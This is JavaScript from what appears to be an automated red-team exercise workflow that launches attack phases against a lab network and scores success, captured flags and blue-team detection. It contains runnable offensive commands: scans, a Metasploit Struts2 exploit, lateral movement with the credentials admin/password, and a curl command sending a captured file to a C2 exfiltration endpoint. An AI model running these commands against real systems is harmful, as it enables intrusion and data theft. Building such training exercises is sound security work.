// Parse attack scenario from webhook
const scenario = $input.item.json.body.scenario || 'reconnaissance';
const exerciseId = $input.item.json.body.exercise_id;
const target = $input.item.json.body.target || '10.0.30.0/24';
const intensity = $input.item.json.body.intensity || 'medium';

// Attack phases
const attackPhases = {
  reconnaissance: {
    order: 1,
    tools: ['nmap', 'masscan', 'amass'],
    stealth: 'loud',
    expected_detection: true,
    commands: [
      `nmap -sV -O -oJ /tmp/recon-${exerciseId}.json ${target}`,
      `masscan ${target} -p1-65535 --rate=1000`,
      `amass enum -passive -d ${target}`
    ]
  },
  vulnerability_scan: {
    order: 2,
    tools: ['nuclei', 'nikto'],
    stealth: 'normal',
    expected_detection: true,
    commands: [
      `nuclei -target ${target} -json -output /tmp/vulns-${exerciseId}.json`,
      `nikto -host ${target} -output /tmp/nikto-${exerciseId}.txt`
    ]
  },
  exploitation: {
    order: 3,
    tools: ['metasploit', 'sqlmap', 'burpsuite'],
    stealth: 'normal',
    expected_detection: true,
    commands: [
      `msfconsole -q -x "use exploit/multi/http/struts2_content_type_ognl; set RHOST ${target}; exploit"`
    ]
  },
  post_exploitation: {
    order: 4,
    tools: ['empire', 'mimikatz', 'bloodhound'],
    stealth: 'stealthy',
    expected_detection: false,
    commands: [
      `python3 /opt/empire/empire --rest --headless`,
      `/opt/bloodhound/bloodhound-python -c All -d ${target}`
    ]
  },
  lateral_movement: {
    order: 5,
    tools: ['impacket', 'crackmapexec'],
    stealth: 'stealthy',
    expected_detection: false,
    commands: [
      `crackmapexec smb ${target} -u admin -p password --shares`,
      `python3 /opt/impacket/psexec.py admin@${target}`
    ]
  },
  data_exfiltration: {
    order: 6,
    tools: ['custom'],
    stealth: 'ninja',
    expected_detection: false,
    commands: [
      `curl -X POST https://c2-server.local/exfil -F "data=@/tmp/captured-flag.txt"`
    ]
  }
};

const phase = attackPhases[scenario] || attackPhases.reconnaissance;

return {
  json: {
    exercise_id: exerciseId,
    scenario: scenario,
    phase: phase,
    target: target,
    intensity: intensity,
    timestamp: new Date().toISOString(),
    red_team_signature: `REDTEAM-${exerciseId}`,
    user_agent: `RedTeam/${exerciseId}`
  }
};

// Collect and parse results from attack
const exerciseId = $('Parse Attack Scenario').item.json.exercise_id;
const scenario = $('Parse Attack Scenario').item.json.scenario;
const commandOutput = $input.item.json.stdout || '';

// Parse results based on scenario
let results = {
  exercise_id: exerciseId,
  scenario: scenario,
  timestamp: new Date().toISOString(),
  success: false,
  objectives_achieved: [],
  detected: false,
  artifacts: [],
  scoring: 0
};

// Check if attack was successful based on output
if (commandOutput.includes('vulnerable') || commandOutput.includes('SUCCESS')) {
  results.success = true;
  results.objectives_achieved.push(scenario);

  // Award points based on scenario
  const points = {
    reconnaissance: 100,
    vulnerability_scan: 150,
    exploitation: 300,
    post_exploitation: 400,
    lateral_movement: 500,
    data_exfiltration: 500
  };

  results.scoring = points[scenario] || 0;
}

// Extract any captured flags
const flagMatch = commandOutput.match(/FLAG\{([^}]+)\}/);
if (flagMatch) {
  results.artifacts.push({
    type: 'flag',
    value: flagMatch[0],
    location: 'captured'
  });
  results.scoring += 500;  // Bonus for flag capture
}

return { json: results };

// Check if Blue Team detected us
const alerts = $input.item.json.data?.affected_items || [];
const results = $('Collect Attack Results').item.json;

if (alerts.length > 0) {
  results.detected = true;
  results.detection_time = alerts[0].timestamp;
  results.detected_by_rule = alerts[0].rule.id;

  // Subtract stealth points if detected
  results.scoring -= 50;
}

return { json: results };

